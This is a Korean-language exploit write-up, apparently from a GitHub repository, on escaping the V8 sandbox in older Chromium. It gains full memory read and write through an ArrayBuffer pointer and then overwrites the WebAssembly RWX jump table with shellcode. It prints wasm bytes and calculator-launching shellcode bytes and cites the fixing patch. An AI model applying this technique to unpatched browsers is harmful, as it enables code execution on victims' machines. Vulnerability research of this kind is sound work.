# Escaping V8 Sandbox via Overwriting WebAssembly Jump Table (Chromium prior to 100.0.4896.60, V8 prior to 10.0.136)

## Setup

- Ubuntu 20.04.6 LTS
- [7c369ec82136ac0afc559aaa0b31614840fcc0a0](https://chromium.googlesource.com/v8/v8.git/+/7c369ec82136ac0afc559aaa0b31614840fcc0a0) (2022.02.15.)

[`sandbox.diff`](./sandbox.diff)는 [[sandbox] Add new Memory Corruption API](https://chromium.googlesource.com/v8/v8/+/4a12cb1022ba335ce087dcfe31b261355524b3bf) (2022.05.20.) 와 동일한 패치로, arbitrary address read/write primitive를 simulate하기 위해 memory corruption API를 구현한다.

[`setup.zsh`](./setup.zsh)

## Exploitation

### Full AAR/AAW via ArrayBuffer

V8 sandbox 내부에서 동작하는 arbitrary address read/write primitive가 있으면 `ArrayBuffer`를 이용하여 sandbox 외부에서도 동작하는 full AAR/AAW primitive를 구현할 수 있다.

![image](https://github.com/user-attachments/assets/f7f37832-a66d-49e4-9aad-a01cfd916a90)

![image](https://github.com/user-attachments/assets/4d8dbe33-09c8-4ba4-9d1d-c8399bca3252)

`ArrayBuffer`는 sandbox 내부에 위치하며 element들을 sandbox 외부의 backing store에 저장하는데, 이 주소를 8-byte full pointer로 가지고 있다. Backing store의 주소를 임의의 주소로 덮어쓰면 그 위치로부터 `ArrayBuffer`의 size만큼 값을 읽거나 쓸 수 있다.

### Overwriting WebAssembly jump table with shellcode

Wasm module을 생성하면 module에 정의된 함수들의 코드를 저장하고 실행하기 위해 RWX permission이 설정된 메모리 영역이 할당된다.

![image](https://github.com/user-attachments/assets/3a87d18d-bec4-4c3c-bcf3-4074e9d6ab25)

이 영역의 주소는 Wasm instance가 저장하고 있다.

![image](https://github.com/user-attachments/assets/d14710d6-7dfb-4c88-89d2-9cd1d8312901)

![image](https://github.com/user-attachments/assets/a54265fc-ad76-486d-ba91-4d660b8c77c1)

이 영역의 가장 앞쪽에는 jump table이 생성된다.

![image](https://github.com/user-attachments/assets/d3d5aec6-b5b5-4313-b1c9-811b61659eb5)

Jump table은 함수가 호출되었을 때 execution flow를 어디로 옮겨야 하는지에 대한 정보를 담고 있다. 즉, 함수를 호출하면 jump table에 저장된 코드가 실행된다. AAW primitive를 이용하여 jump table에 저장된 코드를 shellcode로 덮어쓰면 함수를 호출했을 때 shellcode가 실행되도록 할 수 있다.

[`pwn.wat`](./pwn.wat)

```shell
$ ~/wabt/bin/wat2wasm pwn.wat # output: pwn.wasm
$ python3 wasm.py
[0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]
```

[`shellcode.py`](./shellcode.py)

```shell
$ python3 shellcode.py
[0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5]
```

[`pwn.js`](./pwn.js)

![image](https://github.com/user-attachments/assets/93232559-c20e-4550-9a49-e286bd683b55)

## Patch

> [[wasm] Ship code protection via memory protection keys](https://chromium.googlesource.com/v8/v8.git/+/17b46632cba261c1eb9c87347a05867079e6a7b9) (2022.02.15.)
